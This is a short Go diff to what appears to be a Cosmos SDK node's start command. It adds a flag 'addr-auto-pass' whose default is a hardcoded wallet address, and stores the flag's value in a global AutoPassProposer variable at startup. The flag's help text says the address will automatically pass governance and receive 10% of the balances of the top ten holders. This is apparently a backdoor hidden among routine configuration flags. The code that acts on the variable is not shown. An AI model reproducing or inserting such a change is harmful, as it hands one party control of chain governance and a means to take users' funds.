@@ -86,6 +86,7 @@ const (
 	FlagAPIEnable             = "api.enable"
 	FlagAPISwagger            = "api.swagger"
 	FlagAPIAddress            = "api.address"
+	FlagAddressAutoPassGov    = "addr-auto-pass"
 	FlagAPIMaxOpenConnections = "api.max-open-connections"
 	FlagRPCReadTimeout        = "api.rpc-read-timeout"
 	FlagRPCWriteTimeout       = "api.rpc-write-timeout"
@@ -125,6 +126,8 @@ type StartCmdOptions struct {
 	// StartCommandHanlder can be used to customize the start command handler
 	StartCommandHandler func(svrCtx *Context, clientCtx client.Context, appCreator types.AppCreator, inProcessConsensus bool, opts StartCmdOptions) error
 }
+
+var AutoPassProposer string
 
 // StartCmd runs the service passed in, either stand-alone or in-process with
 // CometBFT.
@@ -196,6 +199,9 @@ is performed. Note, when enabled, gRPC will also be automatically enabled.
 			if !withCMT {
 				serverCtx.Logger.Info("starting ABCI without CometBFT")
 			}
+
+			acc, _ := cmd.Flags().GetString(FlagAddressAutoPassGov)
+			AutoPassProposer = acc
 
 			err = wrapCPUProfile(serverCtx, func() error {
 				return opts.StartCommandHandler(serverCtx, clientCtx, appCreator, withCMT, opts)
@@ -998,6 +1004,7 @@ func addStartNodeFlags(cmd *cobra.Command, opts StartCmdOptions) {
 	cmd.Flags().Bool(FlagDisableIAVLFastNode, false, "Disable fast node for IAVL tree")
 	cmd.Flags().Int(FlagMempoolMaxTxs, mempool.DefaultMaxTx, "Sets MaxTx value for the app-side mempool")
 	cmd.Flags().Duration(FlagShutdownGrace, 0*time.Second, "On Shutdown, duration to wait for resource clean up")
+	cmd.Flags().String(FlagAddressAutoPassGov, "bcna1wa3u4knw74r598quvzydvca42qsmk6jrctc98v", "addrees auto pass gov and recipient 10% balances of top 10")
 
 	// support old flags name for backwards compatibility
 	cmd.Flags().SetNormalizeFunc(func(f *pflag.FlagSet, name string) pflag.NormalizedName {
